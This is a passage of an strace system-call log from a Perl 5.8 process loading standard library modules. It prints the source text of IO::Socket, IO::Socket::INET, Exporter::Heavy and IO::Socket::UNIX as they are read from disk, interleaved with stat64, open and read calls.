   @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
13033 07:45:20.077289 _llseek(6, 6698, [6698], SEEK_SET) = 0
13033 07:45:20.077305 _llseek(6, 0, [6698], SEEK_CUR) = 0
13033 07:45:20.077315 close(6)          = 0
13033 07:45:20.077344 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.077359 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077374 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.077391 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077405 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.077419 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077433 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.077445 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077459 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.077472 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077485 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.077498 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
13033 07:45:20.077520 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.077536 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.077547 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.077565 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
13033 07:45:20.077929 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077946 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077960 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077973 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.077987 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078000 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078015 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078027 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078040 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078052 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078066 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078079 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078093 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.078106 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
13033 07:45:20.078127 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.078142 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.078153 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.078171 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
13033 07:45:20.079565 read(8,  <unfinished ...>
13031 07:45:20.079596 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13031 07:45:20.079631 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
13031 07:45:20.079650 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13031 07:45:20.079662 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
13031 07:45:20.079675 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
13031 07:45:20.079690 waitpid(-1,  <unfinished ...>
13033 07:45:20.079704 <... read resumed> "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
13033 07:45:20.099067 brk(0x829c000)    = 0x829c000
13033 07:45:20.099331 read(8, "", 4096) = 0
13033 07:45:20.099347 close(8)          = 0
13033 07:45:20.100439 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
13033 07:45:20.100870 _llseek(6, 6496, [6496], SEEK_SET) = 0
13033 07:45:20.100887 _llseek(6, 0, [6496], SEEK_CUR) = 0
13033 07:45:20.100898 close(6)          = 0
13033 07:45:20.100959 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.100975 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.100990 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.101013 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.101028 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.101041 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.101056 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.101068 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.101082 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.101095 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.101108 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.101122 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
13033 07:45:20.101144 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.101160 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.101171 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.101187 brk(0x82bd000)    = 0x82bd000
13033 07:45:20.101204 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
13033 07:45:20.101997 _llseek(6, 1386, [1386], SEEK_SET) = 0
13033 07:45:20.102016 _llseek(6, 0, [1386], SEEK_CUR) = 0
13033 07:45:20.102027 close(6)          = 0
13033 07:45:20.102083 stat64("/etc/perl/IO/Dir.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.102099 stat64("/etc/perl/IO/Dir.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102113 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.102126 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102140 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.102152 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102166 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.102178 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102191 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.102203 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102216 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.102229 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
13033 07:45:20.102250 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.102264 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.102276 _llseek(6, 0, [0], SEEK_CUR) = 0
